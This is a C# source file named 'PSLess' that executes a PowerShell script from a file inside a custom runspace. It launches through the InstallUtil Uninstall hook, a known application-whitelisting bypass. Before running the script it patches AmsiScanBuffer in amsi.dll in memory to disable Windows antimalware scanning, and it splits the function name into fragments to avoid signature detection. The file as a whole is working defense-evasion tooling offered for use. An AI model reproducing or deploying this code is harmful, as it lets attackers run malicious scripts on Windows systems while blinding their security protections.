using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;
using System.IO;
using System;
using System.Text;
using System.Configuration.Install;
namespace PSLess
{
 [System.ComponentModel.RunInstaller(true)]
 public class InstallUtil : System.Configuration.Install.Installer
 {
   public override void Uninstall(System.Collections.IDictionary savedState)
   {
       string[] args= {this.Context.Parameters["ScriptName"]};
       PSLess.Main(args);
    }
  }
 
class PSLess
 {
   public static void Main(string[] args)
   {
     if (args.Length == 0)
       Environment.Exit(1);
     string script = LoadScript(args[0]);
     string s = RunScript(script);
     Console.WriteLine(s);
   }
  private static string LoadScript(string filename)
  {
    string buffer = "";
    try
    {
     buffer = File.ReadAllText(filename);
    }
    catch (Exception e)
    {
      Console.WriteLine(e.Message);
      Environment.Exit(2);
    }
    return buffer;
  }
   public static int Disable()
        {
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            if (TargetDLL == IntPtr.Zero) { return 1; }
            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
            if (ASBPtr == IntPtr.Zero) { return 1; }
            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;
            if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }
            Byte[] Patch = { 0x31, 0xff, 0x90 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
            MoveMemory(ASBPtr + 0x001b, unmanagedPointer, 3);
            return 0;
        }
  private static string RunScript(string script)
  {
    Runspace MyRunspace = RunspaceFactory.CreateRunspace();
    MyRunspace.Open();
	  Disable();
    Pipeline MyPipeline = MyRunspace.CreatePipeline();
    MyPipeline.Commands.AddScript(script);
    MyPipeline.Commands.Add("Out-String");
    Collection<PSObject> outputs = MyPipeline.Invoke();
    MyRunspace.Close();
    StringBuilder sb = new StringBuilder();
    foreach (PSObject pobject in outputs)
    {
     sb.AppendLine(pobject.ToString());
    }
    return sb.ToString();
  }
 }
}
